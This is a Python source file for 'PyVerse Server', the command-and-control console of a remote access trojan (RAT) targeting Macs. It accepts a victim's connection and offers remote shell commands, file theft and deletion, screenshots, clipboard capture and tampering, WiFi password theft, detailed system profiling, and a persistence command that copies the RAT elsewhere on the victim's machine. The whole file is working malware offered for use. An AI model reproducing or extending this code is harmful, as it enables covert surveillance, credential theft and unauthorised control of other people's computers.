# Imports
import argparse
import base64
import getpass
import os
import socket
import string
import sys
import time

import pyperclip
from colorama import Fore
from tqdm import tqdm
from playsound import playsound
import random

global connected
user = getpass.getuser()
current_working_dir = os.getcwd()
path = current_working_dir + "/Saved Client Info/"
path1 = current_working_dir + "/Saved Client Info/Screenshots/"
version = 2.2


def mkdirs():
    current_working_directory = os.getcwd()
    client_info_path = current_working_directory + "/Saved Client Info/"
    screenshot_path = current_working_directory + "/Saved Client Info/Screenshots/"
    try:
        if os.path.exists(client_info_path):
            pass
        else:
            os.mkdir(client_info_path)
            print("Success Directory: " + client_info_path + " Was Made")
        if os.path.exists(screenshot_path):
            pass
        else:
            os.mkdir(screenshot_path)
            print("Success Directory: " + screenshot_path + " Was Made")
    except Exception as Error1:
        print("[-] Creation of the directory %s failed" % Error1)
    else:
        pass


mkdirs()


def soundboard():
    conn.send(command.encode())
    volume_data = conn.recv(b_size).decode()
    print(f"""---System Sound---
Current Volume Level: {volume_data}
1: Turn Off System Sound.
2: Turn On System Sound.
3: Change System Sound Volume.
------""")
    userinput = input(f"[$] <{username_data}>: ").lower()
    if userinput == "1":
        conn.send(userinput.encode())
    elif userinput == "2":
        conn.send(userinput.encode())
    elif userinput == "3":
        conn.send(userinput.encode())
        uinput2 = input(f"[+] Enter Volume: ").lower()
        if len(uinput2) > 0:
            conn.send(uinput2.encode())
            print(f"Success: Changed Volume To {uinput2}.")
        else:
            print("[+] Please Input A Number.")
            conn.send("quit".encode())
    else:
        print("[+] Please Select A Choice.")
        conn.send("quit".encode())


def screenshot():
    conn.send(command.encode())
    N = random.randint(1, 5)
    x = ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
    cwd1 = os.getcwd()
    screenshot_path = cwd1 + "/Saved Client Info/Screenshots/Screenshot" + str(x) + '.jpg'
    try:
        conn.settimeout(2.5)
        with open(screenshot_path, 'wb') as f:
            while True:
                image_data_socket = conn.recv(204080)
                imgdata = base64.b64decode(image_data_socket)
                if not imgdata:
                    break
                else:
                    f.write(imgdata)
        print("Sucessfully Saved Screenshot To: " + screenshot_path)
    except Exception as Error2:
        print("[-] Screenshot Saving Failed Error: " + str(Error2))
        print("Checking If Directories Are Made...")
        mkdirs()


def notify(title, text):
    os.system("""
              osascript -e 'display notification "{}" with title "{}"'
              """.format(text, title))


def wifipassword():
    conn.settimeout(60)
    print(f"[+] Waiting For {username_data} To Authenticate Time Till Timeout: 60s")
    conn.send(command.encode())
    name_data = conn.recv(b_size).decode()
    received_data = conn.recv(b_size).decode()
    password = received_data.replace("\\n'", '')
    password = password.replace("b'", '')
    password_Split = password.split()
    password_Split = password_Split[-1]
    print("WiFi Name:" + name_data)
    print("WiFi Password:" + password_Split)
    time.sleep(.5)
    userinput = input("Would You Like To Save This Information y/n?\n").lower()
    if ("y" or 'yes') in userinput:
        cwd1 = os.getcwd()
        path_1 = cwd1 + "/Saved Client Info/WiFi Password.txt"
        file1 = open(path_1, 'w')
        file1.write("WiFi Name: " + name_data + "\n" + "WiFi Password: " + password_Split)
        print("WiFi Password And Name Saved To: " + path_1)


def dlimage():
    conn.send(command.encode())
    current_working_directory = conn.recv(b_size).decode()
    print(f"Current Working Dir: {current_working_directory}")
    url = input("Enter Image URL For Download: ")
    conn.send(url.encode())
    file_name1 = input("Enter File Name For New Image: ")
    file_name = file_name1 + ".jpg"
    conn.send(file_name.encode())
    file_path = conn.recv(b_size).decode()
    print("SUCCESS: Saved To " + file_path)


def logo():
    os.system('clear')
    print(Fore.LIGHTRED_EX + """
 ______                                      ______  
(_____ \                                    (_____ \ 
 _____) )   _ _   _ _____  ____ ___ _____     ____) )
|  ____/ | | | | | | ___ |/ ___)___) ___ |   / ____/ 
| |    | |_| |\ V /| ____| |  |___ | ____|  | (_____ 
|_|     \__  | \_/ |_____)_|  (___/|_____)  |_______)
       (____/                                                                
""")


s = socket.socket()
s_host = socket.gethostname()
s_port = 5004
b_size = 999999999

parser = argparse.ArgumentParser(description="Choose Your Host And Port")
parser.add_argument('-host', metavar='host', type=str, nargs='?', default=socket.gethostname())
parser.add_argument('-port', metavar='port', type=int, nargs='?', default=5004)
args = parser.parse_args()


def v_conn():
    print(Fore.LIGHTGREEN_EX + "[+] ----------PyVerse Server (M)---------- ")
    print(Fore.LIGHTGREEN_EX + f"[+] Connected To {username_data}:{addr}:{s_port}")


logo()
# noinspection PyRedeclaration
connected = False
print("-" * 50)
print(Fore.LIGHTGREEN_EX + f"""[+] Made By: Izaan Noman
[+] Version: {version}""")
print(Fore.LIGHTGREEN_EX + f"[+] Listening On {args.host}:{args.port}...")


def serverbind():
    try:
        s.bind((s_host, s_port))
        s.listen(1)
    except Exception as ERROR:
        print("[-] Binding Failed Error Code: " + str(ERROR) + "\nRetrying...")
        time.sleep(5)
        serverbind()


serverbind()
conn, addr = s.accept()
username_data = conn.recv(b_size).decode()
notify("[Pyverse Server]", f"[+] {username_data}:{addr}:{s_port} Has Joined Your Server.")
playsound('/Users/izaannoman/Desktop/discord.mp3')
print(f"[+] {username_data}:{addr}:{s_port} Has Connected.")

# noinspection PyRedeclaration
connected = True
# Commands
while connected:
    conn.settimeout(45)
    command = input(Fore.LIGHTBLUE_EX + f"[$] <{username_data}> ").lower()
    if command == "quit":
        conn.send(command.encode())
        conn.close()
        s.close()
        time.sleep(.5)
        quit()
    elif command == "cwd":
        conn.send(command.encode())
        cwd = conn.recv(b_size)
        cwd = cwd.decode()
        print(cwd)
    elif command == "help":
        print(Fore.LIGHTGREEN_EX + """[+]--PyVerse Help Options--
Key: [*] - Requires Elevation.
[H] cwd             - View Current Working Directory.
[H] quit            - Exit The Connection So You Can Connect Again.
[H] help            - Print Help Options.
[H] clear           - Clear The Terminal Screen.
[H] vdir            - View The Contents Of Any Directory.
[H] del             - Delete Any File.
[H] dfile           - Download Any Text Based File.
[H] dlimage         - Download Any Image From The Web To The Clients Mac.
[H] sfile           - Send Any Text Based File.
[H] cd              - Change Current Working Directory.
[H] vconn           - View Current Connection Status.
[H] sysinfo         - View Clients System Info.
[H] os              - Run Native Terminal Commands.
[H] cboard          - View Contents And Copy Clipboard.
[H] chgboard        - Change The Clients Current Clipboard.
[H] speechtext      - Translate The Clients Speech To Text. [*] *Experimental*
[H] getwifi         - Get The Current WiFi Password. [*]
[H] wifinfo         - Retrieve Clients WiFi Information.
[H] exit            - Exit The Program Fully On The Clients Mac.
[H] restart         - Restart The Connection Between You And The Client.
[H] processlist     - List The Open Processes.
[H] remove rat      - Remove The RAT From The Clients Mac.
[H] screenshot      - Take A Screenshot Of The Clients Mac.
[H] soundboard      - Control System Sound.
[H] caffeinate      - Prevent Mac From Sleeping.
[H] uncaffeinate    - Let The Mac Sleep.
[H] persist         - Make A Copy Of The RAT To Any Directory.
----""")
    elif command == "del":
        conn.send(command.encode())
        try:
            f_path = input("Enter Last Path And File Name: ")
            f_path = str(f_path)
            conn.send(f_path.encode())
            time.sleep(.5)
            if not f_path:
                conn.send(" ".encode())
                data = conn.recv(b_size).decode()
                print(data)
            else:
                data = conn.recv(b_size).decode()
                print("[+] Successfully Deleted " + "'" + data + "'")
        except Exception as Error:
            print(str(Error))
    elif command == "vdir":
        conn.send(command.encode())
        vdir = input("Enter File Path: ").lower()
        if vdir == "cwd":
            conn.send(vdir.encode())
            data = conn.recv(b_size).decode()
            data = data.replace(",", "\n")
            data = data.replace("'", "")
            print(data)
        else:
            if len(vdir) > 0:
                conn.send(vdir.encode())
                data = conn.recv(b_size)
                data = str((data.decode()))
                data = data.replace(",", "\n")
                data = data.replace("'", "")
                print(data)
            else:
                conn.send("/".encode())
                data = conn.recv(b_size)
                data = str((data.decode()))
                data = data.replace(",", "\n")
                data = data.replace("'", "")
                print(data)
    elif command == "clear":
        os.system('clear')
        logo()
        v_conn()
    elif command == "dfile":
        try:
            conn.send(command.encode())
            cwd_files = conn.recv(b_size)
            cwd_files = cwd_files.decode()
            print(cwd_files)
            file = input("Enter File Path And Name: ")
            if len(file) > 0:
                conn.send(file.encode())
                data1 = conn.recv(b_size)
                data = str(data1.decode())
                print("Successfully Downloaded")
                filename = input("Enter New Name For File: ")
                newfile = open(filename, 'wb')
                newfile.write(data1)
                newfile.close()
                print("File Saved To: " + str(os.getcwd()))
        except Exception as e:
            print("Error Downloading File: " + str(e))
    elif command == 'sfile':
        try:
            conn.send(command.encode())
            file = input("Enter File Path And Name: ")
            file = "C:/Users/" + getpass.getuser() + "/" + file
            data = open(file, 'rb')
            file_data = data.read(b_size)
            conn.send(file_data)
            filename = input("Please Enter New File Name: ")
            conn.send(filename.encode())
            print(file + " Has Been Sent!")
        except Exception as e:
            print("Not A Valid Directory!: " + str(e))
    elif command == "os":
        conn.send(command.encode())
        cmd = input("Enter Command For Execution: ")
        conn.send(cmd.encode())
        if len(cmd) > 0:
            data = conn.recv(b_size).decode()
            print(data)
        else:
            conn.send('quit'.encode())
    elif command == "cd":
        try:
            conn.send(command.encode())
            path = input("Enter Full Path: ")
            conn.send(path.encode())
            data = conn.recv(b_size)
            data = data.decode()
            print(data)
        except Exception as e:
            print("[-] Error: " + str(e))
        pass
    elif command == "live":
        conn.send(command.encode())
        data = conn.recv(b_size).decode()
        print(data)
    elif command == "vconn":
        v_conn()
    elif command == "sysinfo":
        conn.send(command.encode())
        print("=" * 20 + "Data Types" + "=" * 20 + """
        Key - * = Can Take A Very Long Time
        [?] 1 - Hardware Information.
        [?] 2 - Ethernet And Printer Information.
        [?] 3 - Network Information.
        [?] 4 - Software Information.
        [?] 5 - Accessibility Information.
        [*] 6 - Applications Information.
        [?] 7 - Bluetooth Information.
        [?] 8 - Hard Drive Information.
        [?] 9 - Power Information.
        [?] 10 - Airport Information.
        [?] 11 - Mini Information Of The Clients Mac.
        [?] 12 - Basic Information Of The Clients Mac.
        [*] 13 - Everything About The Clients Mac [Can Take Very Long To Load Data] """)
        uinput = str(input("Select Data Type: "))
        if uinput == "1":
            conn.send(uinput.encode())
            loop = tqdm(total=1000, position=0, leave=False)
            for k in range(1000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Hardware Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Hardware Information To " + path)
        elif uinput == "2":
            conn.send(uinput.encode())
            loop = tqdm(total=1500, position=0, leave=False)
            for k in range(1500):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Ethernet And Printer Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Ethernet And Printer Information To " + path)
        elif uinput == "3":
            conn.send(uinput.encode())
            loop = tqdm(total=1000, position=0, leave=False)
            for k in range(1000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Network Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Network Information To " + path)
        elif uinput == "4":
            conn.send(uinput.encode())
            loop = tqdm(total=5000, position=0, leave=False)
            for k in range(5000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Software Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Software Information To " + path)
        elif uinput == "5":
            conn.send(uinput.encode())
            loop = tqdm(total=1000, position=0, leave=False)
            for k in range(1000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Accessibility Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Accessibility Information To " + path)
        elif uinput == "6":
            conn.send(uinput.encode())
            loop = tqdm(total=15000, position=0, leave=False)
            for k in range(15000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Application Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Application Information To " + path)
        elif uinput == "7":
            conn.send(uinput.encode())
            loop = tqdm(total=1000, position=0, leave=False)
            for k in range(1000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Bluetooth Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Bluetooth Information To " + path)
        elif uinput == "8":
            conn.send(uinput.encode())
            loop = tqdm(total=1000, position=0, leave=False)
            for k in range(1000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Hard Drive Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Hard Drive Information To " + path)
        elif uinput == "9":
            conn.send(uinput.encode())
            loop = tqdm(total=1000, position=0, leave=False)
            for k in range(1000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Power Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Power Information To " + path)
        elif uinput == "10":
            conn.send(uinput.encode())
            loop = tqdm(total=22000, position=0, leave=False)
            for k in range(22000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Airport Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Airport Information To " + path)
        elif uinput == "11":
            conn.send(uinput.encode())
            loop = tqdm(total=50000, position=0, leave=False)
            for k in range(50000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Mini Mac Analysis Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Mini Mac Analysis Information To " + path)
        elif uinput == "12":
            conn.send(uinput.encode())
            loop = tqdm(total=80000, position=0, leave=False)
            for k in range(80000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Basic Mac Analysis Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Basic Mini Mac Analysis Information To " + path)
        elif uinput == "13":
            conn.send(uinput.encode())
            loop = tqdm(total=350000, position=0, leave=False)
            for k in range(350000):
                loop.set_description("Receiving Data...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTBLUE_EX + "The Data Cannot Be Printed Due To The Size.")
            time.sleep(.5)
            uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Full Mac Analysis Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Full Mini Mac Analysis Information To " + path)
        else:
            print("Please Select A Data Type.")
            conn.send("quit".encode())
            pass
    elif command == "cboard":
        conn.send(command.encode())
        data = conn.recv(b_size).decode()
        print("[+] Clipboard Contents: " + data)
        uinput = input("[!] Do You Want To Copy To Your Clipboard y/n?\n").lower()
        if ("y" or "yes") in uinput:
            pyperclip.copy(data)
            time.sleep(.5)
            print("[!] Copied!")
        else:
            pass
    elif command == "chgboard":
        conn.send(command.encode())
        data = conn.recv(b_size).decode()
        print("[+] Current Clipboard Contents: " + data)
        time.sleep(.5)
        uinput = input("Enter New Clipboard Content: ")
        conn.send(uinput.encode())
        time.sleep(.5)
        print("[+] Successfully Changed Clipboard Contents To: " + uinput)
    # elif command == "speechtext":
    #     uinput = input("Do You Want To Continue? This Requires Microphone Access. y/n?\n").lower()
    #     if ("y" or "yes") in uinput:
    #         conn.send(command.encode())
    #         print("[+] Listening For Audio...")
    #         data = conn.recv(b_size).decode()
    #         print("[+] Client Said: " + data)
    elif command == "getwifi":
        try:
            uinput = input("Do You Want To Continue? This Requires Elevation. y/n?\n").lower()
            if ("y" or "yes") in uinput:
                time.sleep(.5)
                wifipassword()
        except Exception as error:
            print(error)
    elif command == "wifinfo":
        conn.send(command.encode())
        data = conn.recv(b_size).decode()
        print("=" * 20 + "WiFi Info" + "=" * 20 + "\n" + data)
        print("=" * 20 + "WiFi Info" + "=" * 20)
        uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
        if ("y" or "yes") in uinput:
            path = path + "WiFi Info.txt"
            file = open(path, 'w')
            file.write(data)
            file.close()
            time.sleep(.5)
            print("Saved WiFi Information To " + path)
    elif command == "exit":
        uinput = input("Are You Sure You Want To Exit Both Client And Server Will Disconnect y/n?: \n").lower()
        if ("y" or "yes") in uinput:
            conn.send(command.encode())
            time.sleep(1)
            s.close()
            conn.close()
            quit()
        else:
            pass
    elif command == "dlimage":
        dlimage()
    elif command == "restart":
        conn.send(command.encode())
        time.sleep(.5)
        conn.close()
        s.close()
        print("Restarting...")
        time.sleep(.5)
        os.execl(sys.executable, sys.executable, *sys.argv)
    elif command == "processlist":
        conn.send(command.encode())
        data = conn.recv(b_size).decode()
        print(data)
        uinput = input("[!] Would You Like To Save This Information y/n?\n").lower()
        if ("y" or "yes") in uinput:
            path = path + "Processes List.txt"
            file = open(path, 'w')
            file.write(data)
            file.close()
            time.sleep(.5)
            print("Saved Processes Information To " + path)
    elif command == "remove rat":
        uinput = input("[!] Are You Sure You Want To Remove The RAT y/n?\n").lower()
        if ("y" or "yes") in uinput:
            print("[!] This Will Remove The RAT Causing You To No Longer Have Access To The Clients Mac.")
            uinput = input("[!] Continue y/n?\n")
            if ("y" or "yes") in uinput:
                uinput = input("[!] Are You Really Sure y/n?\n")
                if ("y" or "yes") in uinput:
                    conn.send(command.encode())
                    data = conn.recv(b_size).decode()
                    print("[+] Successfully Removed " + data)
                    time.sleep(.5)
                    conn.close()
                    s.close()
                uinput = input("[!] Restart Server y/n?\n").lower()
                if ("y" or 'yes') in uinput:
                    print("[!] Restarting Server...")
                    time.sleep(.5)
                    os.execl(sys.executable, sys.executable, *sys.argv)
                else:
                    quit()
    elif command == "screenshot":
        screenshot()
    elif command == "soundboard":
        soundboard()
    elif command == "caffeinate":
        conn.send(command.encode())
        uinput = input("[!] How Many Seconds: ")
        conn.send(uinput.encode())
        print(f"[+] Successfully Caffeinated {username_data}'s Mac For {uinput}s. ")
    elif command == "uncaffeinate":
        conn.send(command.encode())
        print(f"[+] Uncaffeinated {username_data}'s Mac.")
    elif command == "persist":
        conn.send(command.encode())
        user_input = input("Enter Directory: ")
        conn.send(user_input.encode())
        data = conn.recv(b_size).decode()
        print(f"[+] Result: {data}")
    elif command == "update":
        conn.send(command.encode())
        cwd = os.getcwd()
        print("Current Working Directory: " + cwd)
        uinput_1 = input("Please Enter The Directory Which The Updated File Is: ")
        uinput_2 = cwd + uinput_1
        updated_file = open(uinput_2, 'r')
        data = updated_file.read()
        print(data)
        conn.send(data.encode())
    elif command == "test":
        conn.send(command.encode())
    else:
        print("Command Not Recognized Please Use 'Help' For More Command Options ")
